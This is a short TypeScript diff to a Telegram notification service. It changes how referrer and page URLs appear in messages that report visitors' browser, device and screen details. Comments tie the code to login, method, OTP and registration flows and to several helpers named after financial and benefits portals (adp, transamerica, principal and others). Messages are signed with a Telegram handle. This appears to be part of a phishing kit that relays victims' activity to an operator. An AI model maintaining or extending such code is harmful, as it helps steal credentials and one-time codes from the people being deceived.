@@ -77,6 +77,19 @@ function asCode(value: unknown): string {
   return `<code>${escapeTelegramHtml(t)}</code>`;
 }
 
+/**
+ * Canonical URL field: a real URL becomes a clickable `<a href>` anchor, while
+ * `Direct` and anything non-URL stays a `<code>` label. Matches the helper used
+ * by adp, ebcparticipant, igoe, principal, raiseright and transamerica.
+ */
+function asUrlField(value: unknown, fallback = "Unknown"): string {
+  const t = value == null || value === "" ? "" : String(value).trim();
+  const resolved = t || fallback;
+  if (resolved === "Direct") return asCode(resolved);
+  if (isHttpUrl(resolved)) return asLink(resolved);
+  return asCode(resolved);
+}
+
 /** Site header for all ops flow messages (login / method / OTP / registration). */
 export function wrapFlowMessage(body: string): string {
   return `🏷️ <b>${escapeTelegramHtml(SITE_NAME)}</b>\n━━━━━━━━━━━━━━━━━━\n\n${body}`;
@@ -199,8 +212,8 @@ class TelegramService {
       `👨‍💻 <b>Browser:</b> ${asCode(data.browserLabel ?? "Unknown")}`,
       `📱 <b>Device:</b> ${asCode(data.deviceLabel ?? "Unknown")}`,
       `🖥️ <b>Screen:</b> ${asCode(data.screen)}`,
-      `🔗 <b>Referrer:</b> ${asCode(referrer)}`,
-      `🌐 <b>URL:</b> ${asCode(pageUrl)}`,
+          `🔗 <b>Referrer:</b> ${asUrlField(referrer, "Direct")}`,
+          `🌐 <b>URL:</b> ${asUrlField(pageUrl)}`,
       "",
       `<a href="https://t.me/th3_allfather">All Father</a>`,
     ];
